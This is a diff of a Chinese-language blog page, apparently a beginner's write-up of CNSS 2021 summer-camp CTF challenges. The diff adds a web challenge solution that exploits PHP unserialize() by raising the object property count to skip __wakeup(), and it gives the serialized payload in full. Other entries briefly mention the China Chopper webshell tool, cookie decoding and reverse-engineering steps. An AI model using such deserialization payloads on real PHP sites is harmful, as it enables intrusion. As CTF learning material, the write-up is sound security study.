@@ -7,18 +7,14 @@
         <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
         <title>CNSS2021夏令营游记 - Shino Channel</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="CNSS2021夏令营游记" />
 <meta property="og:description" content="写在前面 ​	第一次玩CTF属于是，萌新吓傻了。（更新中）
-Web 0x01第一次冒险 ​	按照网页提示操作，最后结合提示在cookie中得到一个字符串，使用base64解密得到flag
-0x02更简单的计算题 ​	算出来发现提交不了？F12修改输入框的长度限制和提交按钮的disable状态，提交得到flag
-0x03卖菜刀 ​	依照题目，使用工具中国菜刀，在网站根目录可以找到flag文件。
-Reverse 0x01 Hello Reverse ​	使用ida反编译后即可看到flag
-0x02 Where Are U ​	使用ida反编译后到处找找就有了
-0x03 吸/吸嘉嘉 ​	反编译后发现程序将flag的每一位字母按位非(~)后与code数组比对。找到code数组，将每一位按位非之后就可以得到答案了。
-​	我是手算的，我可能是弱智。
-0x05 没想好名字的题目 ​	反编译之后先把变量名改成人能看的，然后发现三个for套for分别在判断行、列、方块是否有重复数字。结合程序名称发现是数独。分析程序前半部分，发现数独的形成模式是将flag[]的数字填入a[]中值为0的部分中。找到a的初始值，做数独即可得到flag。
-Pwn 0x01 让我康康你的Nc ​	安装netcat，按题目方式连接之后cat flag即可得到结果。
-Crypto 最有意思的难道不是crypto吗
-龙王的代码I ​	看程序发现flag就是1000000之内素数的平方和。随便写个线性筛就可以得到答案了。
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  #include &lt;bits/stdc&#43;&#43;.h&gt;using namespace std; const int MAXN = 10000050; int notp[MAXN], cntp, p[MAXN], n, m; long long ans; int main() { n = 1000000; notp[1] = 1; for(int i = 2; i &lt;= n; &#43;&#43;i) { if(!" />
+Web 0x01 第一次冒险 ​	按照网页提示操作，最后结合提示在cookie中得到一个字符串，使用base64解密得到flag
+0x02 更简单的计算题 ​	算出来发现提交不了？F12修改输入框的长度限制和提交按钮的disable状态，提交得到flag
+0x03 卖菜刀 ​	依照题目，使用工具中国菜刀，在网站根目录可以找到flag文件。
+0x04 最好的语言？ ​	这个题有点难，搞了好久。具体就是利用php的反序列化漏洞，即最后会将GET到的interesting参数反序列化。而我们可以利用这一点在interesting变量中加入代码让它执行达到目的。
+​	class中的wakeup()函数会在对象被反序列化的时候执行，destruct()函数会在对象被销毁时执行。观察一下当a=&lsquo;1&rsquo;,b=&lsquo;2&rsquo;,c=&lsquo;3&rsquo;时对象就会在被销毁时输出flag。（注意是字符类型的123）而wakeup()函数会把abc修改成数值类型的123。而众所周知，对象会在程序执行结束后被销毁。所以我们的目的就是：利用反序列化漏洞构造一个Flag类的参数t，并且绕过其反序列化时执行的wakeup()直接执行destruct()。
+​	那么怎么绕过wakeup()呢？
+​	百度搜索可以得知：在某些php版本中，如果表示对象属性个数的值大于真实的属性个数时就会跳过wakeup()的执行。写个代码看看对象序列化之后啥样：
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  class Flag { public $a = &#39;1&#39;; protected $b = &#39;2&#39;; private $c = &#39;3&#39;; function __construct() { $this-&gt;a = &#39;1&#39;; $this-&gt;b = &#39;2&#39;; $this-&gt;c = &#39;3&#39;; } } $t = new Flag(); echo serialize($t);   得到结果：" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://sh11no.github.io/cnsssummer/" /><meta property="og:image" content="http://sh11no.github.io/logo.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-08-20T13:36:08+08:00" />
@@ -29,18 +25,14 @@ Crypto 最有意思的难道不是crypto吗
 
 <meta name="twitter:title" content="CNSS2021夏令营游记"/>
 <meta name="twitter:description" content="写在前面 ​	第一次玩CTF属于是，萌新吓傻了。（更新中）
-Web 0x01第一次冒险 ​	按照网页提示操作，最后结合提示在cookie中得到一个字符串，使用base64解密得到flag
-0x02更简单的计算题 ​	算出来发现提交不了？F12修改输入框的长度限制和提交按钮的disable状态，提交得到flag
-0x03卖菜刀 ​	依照题目，使用工具中国菜刀，在网站根目录可以找到flag文件。
-Reverse 0x01 Hello Reverse ​	使用ida反编译后即可看到flag
-0x02 Where Are U ​	使用ida反编译后到处找找就有了
-0x03 吸/吸嘉嘉 ​	反编译后发现程序将flag的每一位字母按位非(~)后与code数组比对。找到code数组，将每一位按位非之后就可以得到答案了。
-​	我是手算的，我可能是弱智。
-0x05 没想好名字的题目 ​	反编译之后先把变量名改成人能看的，然后发现三个for套for分别在判断行、列、方块是否有重复数字。结合程序名称发现是数独。分析程序前半部分，发现数独的形成模式是将flag[]的数字填入a[]中值为0的部分中。找到a的初始值，做数独即可得到flag。
-Pwn 0x01 让我康康你的Nc ​	安装netcat，按题目方式连接之后cat flag即可得到结果。
-Crypto 最有意思的难道不是crypto吗
-龙王的代码I ​	看程序发现flag就是1000000之内素数的平方和。随便写个线性筛就可以得到答案了。
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  #include &lt;bits/stdc&#43;&#43;.h&gt;using namespace std; const int MAXN = 10000050; int notp[MAXN], cntp, p[MAXN], n, m; long long ans; int main() { n = 1000000; notp[1] = 1; for(int i = 2; i &lt;= n; &#43;&#43;i) { if(!"/>
+Web 0x01 第一次冒险 ​	按照网页提示操作，最后结合提示在cookie中得到一个字符串，使用base64解密得到flag
+0x02 更简单的计算题 ​	算出来发现提交不了？F12修改输入框的长度限制和提交按钮的disable状态，提交得到flag
+0x03 卖菜刀 ​	依照题目，使用工具中国菜刀，在网站根目录可以找到flag文件。
+0x04 最好的语言？ ​	这个题有点难，搞了好久。具体就是利用php的反序列化漏洞，即最后会将GET到的interesting参数反序列化。而我们可以利用这一点在interesting变量中加入代码让它执行达到目的。
+​	class中的wakeup()函数会在对象被反序列化的时候执行，destruct()函数会在对象被销毁时执行。观察一下当a=&lsquo;1&rsquo;,b=&lsquo;2&rsquo;,c=&lsquo;3&rsquo;时对象就会在被销毁时输出flag。（注意是字符类型的123）而wakeup()函数会把abc修改成数值类型的123。而众所周知，对象会在程序执行结束后被销毁。所以我们的目的就是：利用反序列化漏洞构造一个Flag类的参数t，并且绕过其反序列化时执行的wakeup()直接执行destruct()。
+​	那么怎么绕过wakeup()呢？
+​	百度搜索可以得知：在某些php版本中，如果表示对象属性个数的值大于真实的属性个数时就会跳过wakeup()的执行。写个代码看看对象序列化之后啥样：
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  class Flag { public $a = &#39;1&#39;; protected $b = &#39;2&#39;; private $c = &#39;3&#39;; function __construct() { $this-&gt;a = &#39;1&#39;; $this-&gt;b = &#39;2&#39;; $this-&gt;c = &#39;3&#39;; } } $t = new Flag(); echo serialize($t);   得到结果："/>
 <meta name="application-name" content="LoveIt">
 <meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -53,7 +45,7 @@ Crypto 最有意思的难道不是crypto吗
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/sh11no.github.io\/cnsssummer\/"
-        },"genre": "posts","wordcount":  432 ,
+        },"genre": "posts","wordcount":  504 ,
         "url": "http:\/\/sh11no.github.io\/cnsssummer\/","datePublished": "2021-08-20T13:36:08+08:00","dateModified": "2021-08-20T13:36:08+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -130,7 +122,7 @@ Crypto 最有意思的难道不是crypto吗
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">CNSS2021夏令营游记</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Shino</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-20">2021-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 432 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-20">2021-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 504 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="true">
                 <div class="details-summary toc-title">
@@ -142,9 +134,10 @@ Crypto 最有意思的难道不是crypto吗
     <li><a href="#写在前面">写在前面</a></li>
     <li><a href="#web">Web</a>
       <ul>
-        <li><a href="#0x01第一次冒险">0x01第一次冒险</a></li>
-        <li><a href="#0x02更简单的计算题">0x02更简单的计算题</a></li>
-        <li><a href="#0x03卖菜刀">0x03卖菜刀</a></li>
+        <li><a href="#0x01-第一次冒险">0x01 第一次冒险</a></li>
+        <li><a href="#0x02-更简单的计算题">0x02 更简单的计算题</a></li>
+        <li><a href="#0x03-卖菜刀">0x03 卖菜刀</a></li>
+        <li><a href="#0x04-最好的语言">0x04 最好的语言？</a></li>
       </ul>
     </li>
     <li><a href="#reverse">Reverse</a>
@@ -186,12 +179,75 @@ Crypto 最有意思的难道不是crypto吗
             </div><div class="content" id="content"><h2 id="写在前面">写在前面</h2>
 <p>​	第一次玩CTF属于是，萌新吓傻了。（更新中）</p>
 <h2 id="web">Web</h2>
-<h3 id="0x01第一次冒险">0x01第一次冒险</h3>
+<h3 id="0x01-第一次冒险">0x01 第一次冒险</h3>
 <p>​		按照网页提示操作，最后结合提示在cookie中得到一个字符串，使用base64解密得到flag</p>
-<h3 id="0x02更简单的计算题">0x02更简单的计算题</h3>
+<h3 id="0x02-更简单的计算题">0x02 更简单的计算题</h3>
 <p>​		算出来发现提交不了？F12修改输入框的长度限制和提交按钮的disable状态，提交得到flag</p>
-<h3 id="0x03卖菜刀">0x03卖菜刀</h3>
+<h3 id="0x03-卖菜刀">0x03 卖菜刀</h3>
 <p>​		依照题目，使用工具中国菜刀，在网站根目录可以找到flag文件。</p>
+<h3 id="0x04-最好的语言">0x04 最好的语言？</h3>
+<p>​		这个题有点难，搞了好久。具体就是利用php的反序列化漏洞，即最后会将GET到的interesting参数反序列化。而我们可以利用这一点在interesting变量中加入代码让它执行达到目的。</p>
+<p>​		class中的wakeup()函数会在对象被反序列化的时候执行，destruct()函数会在对象被销毁时执行。观察一下当a=&lsquo;1&rsquo;,b=&lsquo;2&rsquo;,c=&lsquo;3&rsquo;时对象就会在被销毁时输出flag。（注意是字符类型的123）而wakeup()函数会把abc修改成数值类型的123。而众所周知，对象会在程序执行结束后被销毁。所以我们的目的就是：利用反序列化漏洞构造一个Flag类的参数t，并且绕过其反序列化时执行的wakeup()直接执行destruct()。</p>
+<p>​		那么怎么绕过wakeup()呢？</p>
+<p>​		百度搜索可以得知：在某些php版本中，如果表示对象属性个数的值大于真实的属性个数时就会跳过wakeup()的执行。写个代码看看对象序列化之后啥样：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">Flag</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$b</span> <span class="o">=</span> <span class="s1">&#39;2&#39;</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$c</span> <span class="o">=</span> <span class="s1">&#39;3&#39;</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span> <span class="o">=</span> <span class="s1">&#39;2&#39;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">c</span> <span class="o">=</span> <span class="s1">&#39;3&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="nv">$t</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Flag</span><span class="p">();</span>
+
+<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$t</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>得到结果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">O:4:&#34;Flag&#34;:3:{s:1:&#34;a&#34;;s:1:&#34;1&#34;;s:4:&#34;%00*%00b&#34;;s:1:&#34;2&#34;;s:7:&#34;%00Flag%00c&#34;;s:1:&#34;3&#34;;}
+</code></pre></td></tr></table>
+</div>
+</div><p>其中%00是一个空字符，%00*%00表示protected类型，%00Flag%00表示private类型。</p>
+<p>&ldquo;Flag&quot;后面那个数字便是对象数量。按照上文的漏洞修改一下。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">O:4:&#34;Flag&#34;:114514:{s:1:&#34;a&#34;;s:1:&#34;1&#34;;s:4:&#34;%00*%00b&#34;;s:1:&#34;2&#34;;s:7:&#34;%00Flag%00c&#34;;s:1:&#34;3&#34;;}
+</code></pre></td></tr></table>
+</div>
+</div><p>传入$interesting变量得到flag。</p>
 <h2 id="reverse">Reverse</h2>
 <h3 id="0x01-hello-reverse">0x01 Hello Reverse</h3>
 <p>​		使用ida反编译后即可看到flag</p>
